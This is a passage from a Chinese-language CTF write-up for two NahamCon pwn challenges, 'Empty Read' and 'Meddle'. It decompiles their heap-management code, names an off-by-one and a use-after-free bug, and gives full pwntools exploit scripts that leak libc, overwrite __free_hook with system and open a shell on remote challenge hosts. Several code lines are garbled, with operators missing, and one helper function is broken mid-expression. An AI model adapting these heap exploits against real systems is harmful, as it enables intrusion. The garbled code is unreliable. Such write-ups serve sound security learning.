    p.interactive()
## Empty Read
这是一个`32`位的程序。
首先我们看一下程序的整体逻辑。程序一共提供了`4`种功能和一个用来查看远程`libc`版本的`debug`选项。这四个功能分别是`add,edit,show,delete`。依次来看一下，首先是`add`函数。
    puts("\tUser index to add:");
      read(0, buf, 4u);
      index = atoi(buf);
      if ( index  9 || user_list[index] )
      {
        puts("\tInvalid user index!");
      }
      else
      {
        user_list[index] = (struct my_user *)malloc(8u);
        if ( !user_list[index] )
          goto LABEL_6;
        memset(buf, 0, sizeof(buf));
        puts("\tUser email length:");
        read(0, buf, 4u);
        email_length = atoi(buf);
        if ( email_length  512 )
          email_length = 512;
        user_list[index]->email_length = email_length;
        v0 = user_list[index];
        v0->email = (int)malloc(v0->email_length);
        if ( user_list[index]->email )
        {
          puts("\tUser email:");
          length = read(0, (void *)user_list[index]->email, user_list[index]->email_length);
          if ( length email = 0;
          else
            *(_BYTE *)(user_list[index]->email + length) = 0;
        }
        else
        {
    LABEL_6:
          puts("\tSomething went wrong, try again!");
        }
      }
首先是申请了一个`0x10`大小的`user`结构体用来存放堆块指针。然后根据用户指定的大小，申请了相应大小的堆块。将`size`和堆块指针写入到了结构体中。这里很明显的存在一个`off-by-one`漏洞。
`show`函数则是根据用户给定的`index`输出了堆块的内容，`delete`删除了堆块，并将`user_list`相应位置清空。接下来看一下`edit`函数。
    unsigned int edit()
    {
      unsigned int result; // eax
      int index; // [esp+0h] [ebp-18h]
      ssize_t length; // [esp+4h] [ebp-14h]
      char buf[4]; // [esp+8h] [ebp-10h] BYREF
      unsigned int v4; // [esp+Ch] [ebp-Ch]
      v4 = __readgsdword(0x14u);
      puts("\tUser index to edit:");
      read(0, buf, 4u);
      index = atoi(buf);
      if ( index >= 0 && index fd`指针指向`free_hook`，进而覆写`free_hook`为`system`，`getshell`。
    # encoding=utf-8
    from pwn import *
    file_path = "./chall"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    else:
        p = remote('challenge.nahamcon.com', 30770)
        libc = ELF('./libc-2.27.so')
    def add(index, size, content=b"1"):
        p.sendlineafter("---------\n", "add")
        p.sendlineafter("index to add:\n", str(index))
        p.sendlineafter("email length:\n", str(size))
        p.sendafter("User email:\n", content)
    def show():
        p.sendlineafter("---------\n", "print")
    def edit(index, content):
        p.sendlineafter("---------\n", "edit")
        p.sendlineafter("index to edit:\n", str(index))
        p.sendafter("User email:\n", content)
    def delete(index):
        p.sendlineafter("---------\n", "delete")
        p.sendlineafter("index to delete:\n", str(index))
    for i in range(10):
        add(i, 0x8)
    for i in range(10):
        delete(i)
    for i in range(10):
        add(i, 0xfc)
    for i in range(7):
        delete(3 + i)
    delete(0)
    edit(1, b"a" * 0xf8 + p32(0x200))
    delete(2)
    for i in range(7):
        add(3+i, 0xfc)
    add(0, 0xfc)
    show()
    p.recvuntil("User 1 email: ")
    libc.address = u32(p.recv(4)) - 0x38 - 0x18 - libc.sym['__malloc_hook']
    for i in range(7):
        delete(3 + i)
    delete(0)
    for i in range(7):
        add(3+i, 0xfc, b"/bin/sh")
    log.success("libc address is {}".format(hex(libc.address)))
    # gdb.attach(p, "b *$rebase(0xE23)")
    add(0, 0x130)
    edit(0, b"a"*0xfc + p32(0x101) + p32(libc.sym['__free_hook']))
    delete(3)
    delete(1)
    edit(0, b"a"*0xfc + p32(0x101) + p32(libc.sym['__free_hook']))
    add(1, 0xfc)
    add(2, 0xfc, p32(libc.sym['system']))
    delete(4)
    p.interactive()
## Meddle
首先来看一下程序的整体逻辑。程序一共提供了四种功能`add,show,rate,delete`。分别来看一下，首先是`add`函数。
    int add_album()
    {
      int v0; // eax
      __int64 v1; // rcx
      struct album **v2; // rax
      struct album *v4; // [rsp+8h] [rbp-8h]
      if ( count > 17 )
      {
        LODWORD(v2) = puts("no more albums :(");
      }
      else
      {
        v4 = (struct album *)malloc(0x84uLL);
        printf("enter album name: ");
        fgets(v4->name, 0x50, stdin);
        printf("enter artist name: ");
        fgets(v4->artlist, 0x30, stdin);
        v0 = count++;
        v1 = v0;
        v2 = albums_list;
        albums_list[v1] = v4;
      }
      return (int)v2;
    }
申请了一个固定大小的堆块`0x90`，其结构体如下
    00000000 album           struc ; (sizeof=0x84, mappedto_8)
    00000000 rate            dd ?
    00000004 name            db 80 dup(?)
    00000054 artlist         db 48 dup(?)
    00000084 album           ends
接着根据用户的输入设置了`name,artlist`字符数组的内容。`show`函数则是直接输出了结构体中的内容。`rate`函数则是设置了`rate`成员变量的值。接着看一下`delete`函数。
    void delete_album()
    {
      int v0; // [rsp+Ch] [rbp-4h]
      printf("what album would you like to delete? ");
      v0 = getnum();
      if ( v0 = count )
        puts("invalid index :(");
      else
        free(albums_list[v0]);
    }
很明显的存在`UAF`漏洞。
这里的漏洞利用就很简单了，首先是利用`UAF`泄漏出`libc`基地址，然后再次利用`UAF`覆写`tcache->fd`指针为`free_hook`，接着覆写`free_hook`为`system`。
有点麻烦的就是写入`fd`和值的时候需要分为两个四字节来写。
    # encoding=utf-8
    from pwn import *
    file_path = "./meddle"
    context.arch = "amd64"
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(file_path)
    debug = 0
    if debug:
        p = process([file_path])
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    else:
        p = remote('challenge.nahamcon.com', 31490)
        libc = ELF('./libc-2.27.so')
    def add(name=b"11111111\n", artlist=b"222222222\n"):
        p.sendlineafter("> ", "1")
        p.sendafter("album name: ", name)
        p.sendafter("artist name: ", artlist)
    def show(index):
        p.sendlineafter("> ", "2")
        p.sendlineafter("like to view? ", str(index))
    def rate(index, value):
        p.sendlineafter("> ", "3")
        p.sendlineafter("you like to rate? ", str(index))
        p.sendlineafter("to rate this album? ", str(value))
    def delete(index):
        p.sendlineafter("> ", "4")
        p.sendlineafter("you like to delete? ", str(index))
    def get_address():
        p.recvuntil("album name: ")
        hig = u16(p.recvline().strip())
        p.recvuntil("ratings: ")
        address = (int(p.recvline().strip()) & 0xffffffff) + (hig > 32) + b"\n")  # 11
        rate(index, value & 0xffffffff)
    for i in range(8):
        add()
    for i in range(7):
        delete(1 + i)
    # gdb.attach(p, "b *$rebase(0xD14)")
    delete(0)
    show(0)
    libc.address = get_address() - 96 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address is {}".format(hex(libc.address)))
    show(7)
    heap_address = get_address()
    log.success("heap address is {}".format(hex(heap_address)))
    add()  # 8
    set_value(9, 0x68732f6e69622f)
    add()  # 10
    delete(8)
    delete(7)
    set_value(11, libc.sym['__free_hook'])
    add()
    set_value(13, libc.sym['system'])
    delete(9)
    p.interactive()